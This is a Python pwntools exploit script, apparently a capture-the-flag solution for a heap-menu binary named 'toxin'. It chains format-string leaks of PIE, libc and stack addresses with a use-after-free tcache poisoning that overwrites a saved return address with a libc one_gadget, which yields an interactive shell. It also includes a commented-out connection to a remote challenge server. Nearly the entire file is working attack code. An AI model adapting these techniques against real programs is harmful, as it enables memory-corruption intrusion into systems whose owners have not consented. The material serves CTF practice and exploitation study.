#!/usr/bin/python3

from pwn import *

exe = ELF("toxin_patched", checksec=False)
libc = ELF("./lib/libc.so.6", checksec=False)
ld = ELF("./lib/ld-2.27.so", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "WARNING"
isDebug = False

gs = '''
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def sleepFor(x = 0.3):
	sleep(x)


# *****************************************************************************************#
# Exploit functions
# *****************************************************************************************#


def bypass_pie():
	info("Leaking binary...")
	io.sendline(b"4")
	sleepFor()
	io.recvuntil(b"term: ")
	io.send(b"%9$p")
	sleepFor()
	output = io.recvS()
	binary_leak_int = int(output.split(" ")[0], 16)
	exe.address = binary_leak_int - 0x1284
	info(f"{hex(exe.address)=}")

def bypass_aslr():
	info("Leaking libc...")
	io.sendline(b"4")
	sleepFor()
	io.recvuntil(b"term: ")
	io.send(b"%3$p")
	sleepFor()
	output = io.recvS()
	libc_leak_int = int(output.split(" ")[0], 16)
	libc.address = libc_leak_int - 0x110081
	info(f"{hex(libc.address)=}")

def leak_saved_rip_from_stack() -> int:
    info("Leaking rip...")
    io.sendline(b"4")
    sleepFor()
    io.recvuntil(b"term: ")
    io.sendline(b"%1$p")
    sleepFor()
    output = io.recvS()
    rip_leak_int = int(output.split("\n")[0], 16)
    
    # from gdb we can see the leaked stack address is 0xe bytes before the stack address that holds the address of the saved rip (this is
    # the next memory address after the call to menu() function)
    # by overwriting that address with the address of one_gadget we might be able to get a working exploit once the function returns
    return_rip = rip_leak_int + 0xe 
    info(f"{hex(return_rip)=}")
    return return_rip

def add_toxin(idx, payload):
    info(f"Adding toxin .. {idx}")
    io.sendline(b"1")
    sleepFor()
    io.recvuntil(b"formula length: ")
    io.sendline(f"{int(0x68)}".encode())
    sleepFor()
    io.recvuntil(b"index: ")
    io.sendline(f"{idx}".encode())
    sleepFor()
    io.recvuntil(b"toxin formula: ")
    io.sendline(payload)
    sleepFor()

def drink_toxin(idx):
    info(f"Drinking toxin .. {idx}")
    io.sendline(b"3")
    sleepFor()
    io.recvuntil(b"index: ")
    io.sendline(f"{idx}".encode())
    sleepFor()

def edit_toxin(idx, payload):
    info(f"Edit toxin .. {idx}")
    io.sendline(b"2")
    sleepFor()
    io.recvuntil(b"index: ")
    io.sendline(f"{idx}".encode())
    sleepFor()
    io.recvuntil(b"toxin formula: ")
    io.sendline(payload)
    sleepFor()

def brute_stringformat():
	for i in range (1, 30):
		io = start_local(False)
		io.recvuntil(b"> ")
		io.sendline(b"4")
		io.recvuntil(b"term: ")
		io.sendline(f"%{i}$p".encode())
		output = io.recvuntil(b"\n").decode().replace(" not found.", "").strip()
		warning(f"Leak {i}: {output}")
		# get_vmmap(io)
		io.close()

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
#ip_offset = 56
io = start_local(isDebug)
# brute_stringformat()

######## REMOTE ########
# io = remote("206.189.27.45", 31513)

bypass_pie()

bypass_aslr()

saved_rip = leak_saved_rip_from_stack()

add_toxin(0, b"AAAA")

drink_toxin(0)

edit_toxin(0, p64(saved_rip))

add_toxin(1, b"CCCC")

info(f"{hex(libc.address + 0x4f322)=}")

add_toxin(2, p64(libc.address + 0x4f322))

io.interactive()







